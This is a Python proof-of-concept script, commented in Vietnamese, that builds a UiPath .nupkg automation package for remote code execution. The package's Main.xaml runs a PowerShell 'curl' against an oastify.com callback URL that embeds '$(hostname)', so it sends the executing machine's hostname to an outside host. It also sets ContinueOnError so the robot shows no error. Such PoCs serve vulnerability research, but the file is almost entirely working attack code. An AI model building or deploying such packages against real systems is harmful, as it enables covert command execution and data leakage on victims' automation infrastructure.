import zipfile
import os

def create_uipath_poc_clean_run(domain_check, output_filename="RCE_PoC_CleanRun.1.0.0.nupkg"):
    """
    Phiên bản PoC hoàn thiện nhất.
    - Sửa lỗi Legacy (net45, mscorlib).
    - Sửa lỗi cú pháp String (vbQuote).
    - Sửa lỗi Runtime (ContinueOnError=True) để Robot không báo lỗi khi thấy output của nslookup.
    """
    
    # 1. Nội dung Main.xaml
    # THAY ĐỔI QUAN TRỌNG: ContinueOnError="True"
    xaml_content = f"""<Activity mc:Ignorable="sap sap2010" x:Class="Main" xmlns="http://schemas.microsoft.com/netfx/2009/xaml/activities" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:sap="http://schemas.microsoft.com/netfx/2009/xaml/activities/presentation" xmlns:sap2010="http://schemas.microsoft.com/netfx/2010/xaml/activities/presentation" xmlns:scg="clr-namespace:System.Collections.Generic;assembly=mscorlib" xmlns:sco="clr-namespace:System.Collections.ObjectModel;assembly=mscorlib" xmlns:ui="http://schemas.uipath.com/workflow/activities" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
  <x:Members>
    <x:Property Name="in_OrchestratorQueueName" Type="InArgument(x:String)" />
  </x:Members>
  <Sequence DisplayName="PoC Sequence" sap:VirtualizedContainerService.HintSize="450,163">
    <sap:WorkflowViewStateService.ViewState>
      <scg:Dictionary x:TypeArguments="x:String, x:Object">
        <x:Boolean x:Key="IsExpanded">True</x:Boolean>
      </scg:Dictionary>
    </sap:WorkflowViewStateService.ViewState>
    
    <ui:InvokePowerShell x:TypeArguments="x:String" ContinueOnError="True" CommandText="curl {domain_check}" DisplayName="DNS Check PoC" IsScript="True" sap:VirtualizedContainerService.HintSize="388,52" />
    
    <ui:LogMessage DisplayName="Log Message" Message="[&quot;PoC Executed Successfully: DNS Lookup sent to {domain_check}&quot;]" />
  </Sequence>
</Activity>"""

    # 2. Nội dung project.json (Legacy)
    project_json_content = """{
  "name": "RCE_PoC_CleanRun",
  "description": "PoC Clean Run",
  "main": "Main.xaml",
  "dependencies": {
    "UiPath.System.Activities": "[23.10.2]"
  },
  "webServices": [],
  "entitiesStores": [],
  "schemaVersion": "4.0",
  "studioVersion": "23.10.0.0",
  "projectVersion": "1.0.0",
  "runtimeOptions": {
    "autoDispose": false,
    "netFrameworkLazyLoading": false,
    "isPausable": true,
    "isAttended": false,
    "requiresUserInteraction": false,
    "supportsPersistence": false,
    "workflowSerialization": "NewtonsoftJson",
    "excludedLoggedData": [
      "Private:*",
      "*password*"
    ],
    "executionType": "Workflow",
    "readyForPiP": false,
    "startsInPiP": false,
    "mustRestoreAllDependencies": true,
    "pipType": "ChildSession"
  },
  "designOptions": {
    "projectProfile": "Developement",
    "outputType": "Process",
    "libraryOptions": {
      "privateWorkflows": []
    },
    "processOptions": {
      "ignoredFiles": []
    },
    "fileInfoCollection": [],
    "saveToCloud": false
  },
  "expressionLanguage": "VisualBasic",
  "entryPoints": [
    {
      "filePath": "Main.xaml",
      "uniqueId": "00000000-0000-0000-0000-000000000013",
      "input": [],
      "output": []
    }
  ],
  "isTemplate": false,
  "templateProjectData": {},
  "publishData": {},
  "targetFramework": "Legacy"
}"""

    # 3. Nội dung .nuspec (Legacy)
    nuspec_content = """<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">
  <metadata>
    <id>RCE_PoC_CleanRun_4</id>
    <version>1.0.53</version>
    <title>RCE_PoC_CleanRun</title>
    <authors>SecurityResearcher</authors>
    <requireLicenseAcceptance>false</requireLicenseAcceptance>
    <description>PoC Clean Run</description>
    <tags>UiPath StudioProcess</tags>
    <dependencies>
      <group targetFramework=".NETFramework4.6.1">
        <dependency id="UiPath.System.Activities" version="23.10.2" />
      </group>
    </dependencies>
  </metadata>
</package>"""

    # 4. Content Types
    content_types_xml = """<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xaml" ContentType="application/xaml+xml" />
  <Default Extension="json" ContentType="application/json" />
  <Default Extension="nuspec" ContentType="application/octet-stream" />
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml" />
</Types>"""

    # --- Tạo file .nupkg ---
    print(f"[*] Creating {output_filename}...")
    
    with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        # Legacy Folder
        target_folder = "lib/net45/"
        
        zipf.writestr(target_folder + "Main.xaml", xaml_content)
        zipf.writestr(target_folder + "project.json", project_json_content)
        zipf.writestr("RCE_PoC_CleanRun.nuspec", nuspec_content)
        zipf.writestr("[Content_Types].xml", content_types_xml)
        zipf.writestr("_rels/.rels", '<?xml version="1.0" encoding="utf-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships" />')

    print(f"[+] Success! File created: {os.path.abspath(output_filename)}")
    print(f"[+] Payload: nslookup {domain_check}")

# --- Cấu hình ---
DOMAIN_TO_TEST = "http://pxq14sn2k6k5jt8oktz5tyian1tsht5i.oastify.com?a=$(hostname)" 

if __name__ == "__main__":
    create_uipath_poc_clean_run(DOMAIN_TO_TEST)
